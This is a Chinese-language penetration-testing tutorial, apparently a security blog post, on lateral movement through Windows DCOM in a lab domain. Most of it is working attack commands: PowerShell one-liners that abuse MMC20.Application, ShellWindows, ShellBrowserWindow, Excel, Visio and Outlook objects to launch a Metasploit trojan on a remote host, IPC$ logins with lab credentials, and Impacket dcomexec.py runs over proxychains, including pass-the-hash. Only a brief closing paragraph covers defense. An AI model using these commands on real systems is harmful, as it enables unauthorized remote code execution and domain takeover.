![20210120133029.jpg](https://image.3001.net/images/20210121/1611163970_6008694219ad101971035.jpg!small)

## COM

COM即组件对象模型(Component Object Model，COM) ，是基于 Windows 平台的一套 **组件对象接口标准** ，由一组
**构造规范** 和 **组件对象库** 组成。COM是许多微软产品和技术，如Windows媒体播放器和Windows Server的基础。

一般的对象是由数据成员和作用在其上的方法组成，而组件对象和一般对象虽有相似性，但又有较大不同。组件对象不使用方法而用接口来描述自身。接口被定义为“在对象上实现的一组语义上相关的功能”，其实质是一组函数指针表，每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。

## DCOM

DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是Internet上。利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。

> DCOM是COM（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法。DCOM
> 使用远程过程调用（RPC）技术将组件对象模型（COM）的功能扩展到本地计算机之外，因此，在远程系统上托管COM服务器端的软件（通常在DLL或exe中）可以通过RPC向客户端公开其方法。

攻击者可使用 DCOM 进行横向移动，通过 DCOM，攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows
对象远程执行命令。

使用DCOM进行横向移动的优势之一在于， **在远程主机上执行的进程将会是托管COM服务器端的软件** 。例如我们滥用ShellBrowserWindow
COM对象，那么就会在远程主机的现有explorer.exe进程中执行。对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向DCOM公开方法，因此防御者可能难以全面监测所有程序的执行。

## 在本地通过DCOM执行命令

测试环境：Windows 7

### 1\. 获取本地DCOM程序列表

在powershell中执行如下命令获取DCOM程序列表：

    
    
    Get-CimInstance Win32_DCOMApplication

> Get-CimInstance 这个cmdle（powershell命令行）默认只在powershell 3.0以上版本中存在，所以只有 Windows
> server 2012 及以上版本的操作系统才可以使用Get-Ciminstance。

![](https://image.3001.net/images/20210124/1611479267_600d38e3e9a943fc225f8.png!small)

Windows 7、Windows Server 2008中默认安装的是powershell 2.0，所以他们都不支持Get-CimInstance，可以用以下命令代替Get-CimInstance：

    
    
    Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication

![image-20210120144643608](https://image.3001.net/images/20210121/1611163973_6008694524f60bd2bb3a6.png!small)

### 2\. 本地使用DCOM执行任意命令

我们在获取DCOM应用程序的时候，遇到了一个MMC Application Class（MMC20.Application）：

![](https://image.3001.net/images/20210124/1611479319_600d391797de57a893fb2.png!small)

这个COM对象可以编程MMC管理单元操作的组件脚本。我们在本地启动一个管理员权限的powershell，执行如下命令通过PowerShell与DCOM进行交互，创建一个“MMC20.Application”对象的实例（我们只需要提供一个DCOM
ProgID和一个IP地址，就返回一个COM对象的实例）：

    
    
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))

获得COM对象的实例后，我们还可以执行如下命令枚举这个COM对象中的不同方法和属性：

    
    
    # 此时可执行如下命令获得"MMC20.Application"支持的操作
    $com.Document.ActiveView | Get-Member

![20210120145723.png](https://image.3001.net/images/20210121/1611163974_60086946ab5152f9499e6.png!small)

如上图，可以发现该对象有一个 ExecuteShellCommand
方法，可用来执行命令。然后再通过ExecuteShellCommand执行命令，这里启动计算器：

    
    
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")    // 启动计算器

![20210120145830.png](https://image.3001.net/images/20210121/1611163975_60086947c335d456c09a7.png!small)

如上图所示，本地命令执行成功。

除了MMC20.Application，还有ShellWindows、ShellBrowserWindow、Excel.Application以及Outlook.Application等等都可以为我们所利用。

我们通过MMC20.Application的ExecuteShellCommand方法在本地运行了一个“计算器”程序。如果我们提供一个远程主机的IP，便可以使用`[activator]::CreateInstance([type]::GetTypeFromProgID(ProgID,IP))`或`[Activator]::CreateInstance([Type]::GetTypeFromCLSID(CLSID,IP))`命令通过Powershell与远程DCOM进行交互，只需要提供DCOM
ProgID和对方的IP地址，就会向对方提供该DCOM对象的实例，然后就可以利用这个DCOM应用程序和ExecuteShellCommand方法来在对方目标主机上执行命令了。如果攻击者把“计算器”程序换成恶意的payload，就会对系统安全造成威胁。下面进行演示使用DCOM对远程主机执行命令。

## 使用DCOM对远程主机执行命令

下面通过几个实验来演示如何使用DCOM在远程主机上面执行命令。在使用该方法时，需要具有以下条件：

  * 具有管理员权限的PowerShell

  * 可能需要关闭目标系统的防火墙。

  * 在远程主机上执行命令时，必须使用域管的administrator账户或者目标主机具有管理员权限的账户

### （1）调用MMC20.Application远程执行命令

测试环境如下：

![20210120170358.png](https://image.3001.net/images/20210121/1611163977_600869491cbebefddf833.png!small)

如图中，右侧是一个内网环境，域名为god.org，有三台机器：Windows 7（跳板机）、Windows Server 2008（DC）、Windows
Server 2003。

Windows Server 2008（192.168.52.138）为域控制器（机器名为OWA），假设攻击者已经获得了域成员主机Windows
7的一个管理员权限的meterpreter，需要进一步横向渗透去拿下内网的其他机器。

域成员服务器（Windows 7）：

  * IP地址：192.168.52.143

  * 用户名：Aministrator

  * 密码：Liu78963

域控制器DC（Windows Server 2008）：

  * IP地址：192.168.52.138

  * 用户名：Liukaifeng01

  * 密码：Liu78963

 **1\. 先控制跳板机Windows 7通过ipc连接到远程主机Windows Server 2008**

    
    
    net use \\192.168.52.138\ipc$ "Liu78963" /user:Aministrator

![20210120151757.png](https://image.3001.net/images/20210121/1611163978_6008694a41f3f230c629a.png!small)

 **2\.
然后在Windows7跳板机上传一个新的metasploit木马程序shell.exe，并控制Windows7使用copy命令将shell.exe复制到Windows
Server 2008的c盘上面去。**

![20210120152204.png](https://image.3001.net/images/20210121/1611163979_6008694b7bfb5c3353638.png!small)

建立ipc连接并上传木马后，攻击机上开启一个新的msf监听。

 **3\. 然后控制Windows7对Windows Server 2008执行远程命令**

在Windows7的meterpreter中输入如下命令，加载powershell模块并进入powershell交互模式：

    
    
    load powershell  
    powershell_shell

![20210120152441.png](https://image.3001.net/images/20210121/1611163981_6008694d78f49cc456ec9.png!small)

在powershell执行如下命令：

    
    
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.52.138"))  
    // 通过PowerShell与DCOM进行远程交互，此外，我们只需要提供一个DCOM ProgID和一个IP地址，然后，它就从远程返回一个COM对象的实例。  
      
    // 然后执行如下命令，我们就可以调用"ExecuteShellCommand"方法在远程主机上启动进程  
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c C:\shell.exe","Minimized")

![20210120153854.png](https://image.3001.net/images/20210121/1611163983_6008694f8bbe104a5c722.png!small)

如上图所示，内网中的Windows Server 2008主机成功上线。

### （2）调用ShellWindows远程执行命令

![](https://image.3001.net/images/20210124/1611479436_600d398c3da72c8b18f2f.png!small)

实验环境：

![20210120153925.png](https://image.3001.net/images/20210121/1611163985_6008695134bf8854565e0.png!small)

还是上面那个实验环境，同样还是先控制跳板机Windows 7通过ipc连接到内网主机Windows Server
2008，并控制Windows7使用copy命令将shell.exe上传到Windows Server
2008的c盘上面去。最后进入Windows7的powershell，控制Windows7对Windows Server
2008执行远程命令，执行位于Windows Server 2008的c盘里的马：

    
    
    # 通过PowerShell与DCOM进行远程交互，创建ShellWindows对象的实例:
    $com=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.52.138"))
    
    # 然后执行如下命令，我们就可以调用该对象的"ShellExecute"方法在远程主机上启动进程:
    $com.item().Document.Application.ShellExecute("cmd.exe","/c C:\shell.exe","c:\windows\system32",$null,0)
    
    # 完整的命令:
    [Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.52.138")).item().Document.Application.ShellExecute("cmd.exe","/c C:\shell.exe","c:\windows\system32",$null,0)

![20210120154330.png](https://image.3001.net/images/20210121/1611163986_60086952a24938302aec4.png!small)

如上图所示，内网中的Windows Server 2008主机成功上线。

以上这两种方法均适用于Windows 7~Windows 10、Windows Server 2008~Windows Server 2016的系统。

并且无论是否事先建立ipc连接都可以成功执行命令，也就不需要对方主机的凭据，只只需要当前主机的管理员权限即可。

除了MMC20.Application和ShellWindows，还有以下这几种DCOM对象都可以被我们利用。

### （3）调用Excel.Application远程执行命令

使用方法如下：

    
    
    # 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:  
    $com = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","192.168.52.138"))  
    $com.DisplayAlerts = $false  
    ​  
    # 然后执行如下命令，我们就可以调用该对象的"DDEInitiate"方法在远程主机上启动进程:  
    $com.DDEInitiate("cmd.exe","/c C:\shell.exe")

### （4）调用ShellBrowserWindow远程执行命令

![](https://image.3001.net/images/20210124/1611479601_600d3a310a61381be8955.png!small)

使用条件：适用于Windows 10和Windows Server 2012 R2等版本的系统。

使用方法如下：

    
    
    # 通过PowerShell与DCOM进行远程交互，创建Excel.Application对象的实例:  
    $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.52.138"))  
    ​  
    # 然后执行如下命令，我们就可以调用该对象的"shellExecute"方法在远程主机上启动进程:  
    $com.Document.Application.shellExecute("C:\shell.exe")  
    ​  
    # 完整的命令:  
    [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","192.168.52.138")).Document.Application.shellExecute("C:\shell.exe")

### （5）调用Visio.Application远程执行命令

使用条件：目标主机中安装有Visio。

使用方法如下：

    
    
    # 通过PowerShell与DCOM进行远程交互，创建Visio.Application对象的实例:  
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","192.168.52.138"))  
      
    # 然后执行如下命令，我们就可以调用该对象的"shellExecute"方法在远程主机上启动进程:  
    $com.[0].Document.Application.shellExecute("calc.exe")  
    ​  
    # 完整的命令:  
    [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","192.168.52.138")).[0].Document.Application.shellExecute("C:\shell.exe")

### （6）调用Outlook.Application远程执行命令

使用条件：目标主机中安装有Outlook。

通过Outlook创建Shell.Application对象来实现命令行执行：

    
    
    # 通过PowerShell与DCOM进行远程交互，创建Visio.Application对象的实例:  
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","192.168.52.138"))  
    ​  
    # 然后执行如下命令，通过Outlook创建Shell.Application对象并执行命令:  
    $com.createObject("Shell.Application").shellExecute("C:\shell.exe")  
    ​  
    # 完整的命令:  
    [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application","192.168.52.138")).createObject("Shell.Application").shellExecute("C:\shell.exe")

## Impacket里的dcomexec.py脚本

Impacket 里面提供的 dcomexec.py 脚本可以提供一个类似于 wmiexec.py
脚本的半交互式shell，但使用的是DCOM，目前支持MMC20.Application，ShellWindows和ShellBrowserWindow对象。

命令格式如下：

    
    
    ./dcomexec.py domain/username:password@ip  
    ./dcomexec.py domain/username:password@ip <command>

实验环境：

![1611164315_60086a9b10a520efb3658.png!small?1611164315036](https://image.3001.net/images/20210121/1611164315_60086a9b10a520efb3658.png!small?1611164315036)

假设攻击者已经获得了域内主机Windows Server
2012的控制权，并获得了域管理员的用户名和密码，下面演示使用dcomexec.py脚本进一步获取Windows 7的shell。Windows
Server 2012除具有内网IP以外还具有公网IP，Windows 7只有没有公网IP，只有内网IP。

首先我们在Windows Server 2012上上传代理程序，在Windows Server
2012的1080端口上搭建一个socks代理服务器，然后攻击者配置一下proxychains：

![20210121012813.png](https://image.3001.net/images/20210121/1611163988_60086954c5f9d96014f2c.png!small)

此时，我们便可以使用proxychains将攻击者的dcomexec.py代理进入内网了：

    
    
    proxychains4 python3 ./dcomexec.py god/administrator:Liu78963@192.168.10.20  // 获取目标主机的shell  
    ​  
    proxychains4 python3 ./dcomexec.py god/administrator:Liu78963@192.168.10.20 whoami  // 在目标主机上执行命令

![20210121012802.png](https://image.3001.net/images/20210121/1611163989_60086955eeaec0d30f954.png!small)

![20210121010746.png](https://image.3001.net/images/20210121/1611163991_600869570818c92403a01.png!small)

如果没有获取到明文密码，我们还可以直接利用哈希值来代替

    
    
    proxychains4 python3 ./dcomexec.py administrator:@192.168.52.143 whoami -hashes aad3b435b51404eeaad3b435b51404ee:d8f69f9520b448174136e49a1051ef07

![20210121011830.png](https://image.3001.net/images/20210121/1611163992_60086958493da6b5d4057.png!small)

## 防御DCOM横向移动

首要的方法是启动域防火墙，因为默认情况下这会阻止DCOM对象的实例化。但尽管我们开启了防火墙，攻击者仍然可以通过某些方法远程篡改或关闭Windows防火墙。所以，我们还需要进一步设置，详情请看：<https://www.anquanke.com/post/id/107097#h2-8>。

## Ending......

![20210121012542.jpg](https://image.3001.net/images/20210121/1611163994_6008695a5e2e40aa03e23.jpg!small)

> 参考：
>
> <https://blog.csdn.net/qq_41874930/article/details/109736280>
>
> [https://3gstudent.github.io/3gstudent.github.io/域渗透-> 利用DCOM在远程系统执行程序/](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8DCOM%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F/)
>
> <https://xie1997.blog.csdn.net/article/details/104148658>

